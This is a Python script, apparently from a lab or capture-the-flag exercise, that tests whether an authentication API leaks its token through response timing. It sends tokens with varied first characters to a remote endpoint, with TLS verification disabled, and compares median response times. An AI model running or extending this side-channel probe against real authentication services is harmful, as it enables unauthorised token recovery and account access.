import requests
import statistics
import string
import time
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io/api/authenticate"
session = requests.Session()
session.verify = False

def query(token: str, delay: float = 3.0):
    time.sleep(delay)
    while True:
        try:
            t0 = time.perf_counter()
            r = session.post(BASE_URL, json={"token": token}, timeout=15)
            elapsed = (time.perf_counter() - t0) * 1000
            if r.status_code == 502:
                time.sleep(3.5)
                continue
            return elapsed, r.status_code, r.text
        except Exception as e:
            time.sleep(3.5)

# Test a set of distinct characters with 5 samples each to evaluate timing distribution
test_chars = ['a', 'b', 'c', '0', '1', '2', 'A', 'B', 'C', 'Z', 'h', 'z']
samples_per_char = 5

print(f"=== ĐO ĐẠC KIỂM CHỨNG GIẢ THUYẾT TIMING DISCREPANCY ===")
print(f"Số lượng ký tự kiểm tra: {len(test_chars)}")
print(f"Số mẫu đo trên mỗi ký tự: {samples_per_char}")
print(f"Khoảng nghỉ giữa các request: 3.0s (đảm bảo không bị 502)\n")

results = {}
for idx, c in enumerate(test_chars):
    token = c + "0" * 47
    samples = []
    for s_idx in range(samples_per_char):
        elapsed, code, body = query(token, delay=3.0)
        samples.append(elapsed)
    med = statistics.median(samples)
    mean = statistics.mean(samples)
    stdev = statistics.stdev(samples) if len(samples) > 1 else 0
    results[c] = {
        "median": med,
        "mean": mean,
        "stdev": stdev,
        "samples": samples
    }
    print(f"[{idx+1:2d}/{len(test_chars)}] Ký tự '{c}': Median={med:.2f}ms | Mean={mean:.2f}ms (±{stdev:.2f}ms) | Mẫu: {[round(x, 1) for x in samples]}")

print("\n=== TỔNG HỢP VÀ ĐÁNH GIÁ THỐNG KÊ ===")
sorted_by_med = sorted(results.items(), key=lambda x: x[1]["median"], reverse=True)
for c, data in sorted_by_med:
    print(f"Ký tự '{c}': Median = {data['median']:.2f}ms (Mean = {data['mean']:.2f}ms)")

fastest_med = sorted_by_med[-1][1]["median"]
slowest_med = sorted_by_med[0][1]["median"]
diff = slowest_med - fastest_med
print(f"\nChênh lệch lớn nhất giữa ký tự cao nhất và thấp nhất: {diff:.2f}ms")
